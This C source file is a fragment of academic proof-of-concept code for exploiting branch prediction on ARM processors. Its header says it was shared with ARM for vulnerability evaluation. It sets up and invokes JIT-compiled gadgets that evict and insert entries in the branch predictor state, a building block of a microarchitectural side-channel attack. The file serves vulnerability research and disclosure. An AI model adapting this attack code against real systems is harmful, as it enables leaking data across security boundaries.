/*
 * PoC Codes for Bias-Free Branch Predicion Exploitation
 * 
 * Thursday, September 12th 2024
 *
 * Yuhui Zhu - yuhui.zhu@santannapisa.it
 * Alessandro Biondi - alessandro.biondi@santannapisa.it
 *
 * ReTiS Lab, Scuola Superiore Sant'Anna
 * Pisa, Italy
 * 
 * This copy is distributed to ARM for vulnerability evaluation.
 */

#include "evict_probes.h"

#define INVOKE_LIST_LEN_EVICT 4
#define INVOKE_LIST_LEN_INSERT 4

// They just work, I didn't inspect the reasons!
static const uint64_t offset_list_evict[INVOKE_LIST_LEN_EVICT] = {0, 2, 5, 2};
static const uint64_t offset_list_insert[INVOKE_LIST_LEN_INSERT] = {3, 3, 2, 2};
// The evicts[idx][] can be used as the invoke list, so don't touch it here.
jit_bst_entry_blr_t invoke_list_evict[N_PROBES][INVOKE_LIST_LEN_EVICT];
jit_bst_entry_blr_t invoke_list_insert[N_PROBES][INVOKE_LIST_LEN_INSERT];
void *param_list_evict[INVOKE_LIST_LEN_EVICT];
void *param_list_insert[INVOKE_LIST_LEN_INSERT];

// Hold variables from the main program
jit_bst_entry_blr_t (*global_evict_gadgets)[N_PROBES][N_EVICTS_PER_PROBE];
jit_bst_entry_blr_t (*global_probe_gadgets)[N_PROBES];

// Okay, now I will only invoke this function once. So, no branch folding tricks, make evething simple, stupid, and straightforward!!!!!!!
void prep_evict_invoke_list(void *tramp_ret, jit_bst_entry_blr_t evict_gadgets[8][4])
{
    // Prepare parameter list for evict IBs
    for (int invoke_seq = 0; invoke_seq < INVOKE_LIST_LEN_EVICT; invoke_seq++)
    {
        param_list_evict[invoke_seq] = RET_MEM_WRITE_IBHB(offset_list_evict[invoke_seq]);
    }

    // The evicts[idx][] can be used as the invoke list, so don't touch invoke_list_evict[][] here.
    global_evict_gadgets = (jit_bst_entry_blr_t (*)[N_PROBES][N_EVICTS_PER_PROBE])evict_gadgets;
}

void prep_insert_invoke_list(void *tramp_ret, jit_bst_entry_blr_t probe_gadgets[8])
{
    // Prepare parameter list for insert IBs
    for (int invoke_seq = 0; invoke_seq < INVOKE_LIST_LEN_INSERT; invoke_seq++)
    {
        param_list_insert[invoke_seq] = RET_MEM_WRITE_IBHB(offset_list_insert[invoke_seq]);
    }

    // Prepare invoke list for insert IBs
    global_probe_gadgets = (jit_bst_entry_blr_t (*)[N_PROBES])probe_gadgets;
    for (int prep_idx = 0; prep_idx < N_PROBES; prep_idx++)
    {
        for (int invoke_seq = 0; invoke_seq < INVOKE_LIST_LEN_INSERT; invoke_seq++)
            invoke_list_insert[prep_idx][invoke_seq] = probe_gadgets[prep_idx];
    }
}

void prep_cache_mgmt_invoke_list(void *tramp_ret, jit_bst_entry_blr_t probe_gadgets[N_PROBES])
{
    prep_insert_invoke_list(tramp_ret, probe_gadgets);
}

void do_bst_mgmt(int invoke_list_len, jit_bst_entry_blr_t *invoke_list, void *param_list[])
{
    for (int idx_invoke = 0; idx_invoke < invoke_list_len; idx_invoke++)
    {
        NOP(16);
        (invoke_list[idx_invoke])(param_list[idx_invoke]);
        NOP(16);
    }
}

void bst_record_evict(int probe_idx)
{
#ifndef DEBUG_NO_FOLD_INVOCATIONS
    NOP(16);
    do_bst_mgmt(INVOKE_LIST_LEN_EVICT, (*global_evict_gadgets)[probe_idx], param_list_evict);
    NOP(16);
    do_bst_mgmt(INVOKE_LIST_LEN_EVICT, (*global_evict_gadgets)[probe_idx], param_list_evict);
    NOP(16);
#else
    // equivalent to:
    (evicts[probe_idx][0])(RET_MEM_WRITE_IBHB(0));
    (evicts[probe_idx][1])(RET_MEM_WRITE_IBHB(2));
    (evicts[probe_idx][2])(RET_MEM_WRITE_IBHB(5));
    (evicts[probe_idx][3])(RET_MEM_WRITE_IBHB(2));
    (evicts[probe_idx][0])(RET_MEM_WRITE_IBHB(0));
    (evicts[probe_idx][1])(RET_MEM_WRITE_IBHB(2));
    (evicts[probe_idx][2])(RET_MEM_WRITE_IBHB(5));
    (evicts[probe_idx][3])(RET_MEM_WRITE_IBHB(2));

#endif
}

void bst_record_create(int probe_idx)
{
#ifndef DEBUG_NO_FOLD_INVOCATIONS
    NOP(16);
    do_bst_mgmt(INVOKE_LIST_LEN_INSERT, invoke_list_insert[probe_idx], param_list_insert);
    NOP(16);
    do_bst_mgmt(INVOKE_LIST_LEN_INSERT, invoke_list_insert[probe_idx], param_list_insert);
    NOP(16);
#else
    // equivalent to:
    (probes[probe_idx])(RET_MEM_WRITE_IBHB(3));
    (probes[probe_idx])(RET_MEM_WRITE_IBHB(3));
    (probes[probe_idx])(RET_MEM_WRITE_IBHB(2));
    (probes[probe_idx])(RET_MEM_WRITE_IBHB(2));
    (probes[probe_idx])(RET_MEM_WRITE_IBHB(3));
    (probes[probe_idx])(RET_MEM_WRITE_IBHB(3));
    (probes[probe_idx])(RET_MEM_WRITE_IBHB(2));
    (probes[probe_idx])(RET_MEM_WRITE_IBHB(2));
#endif
}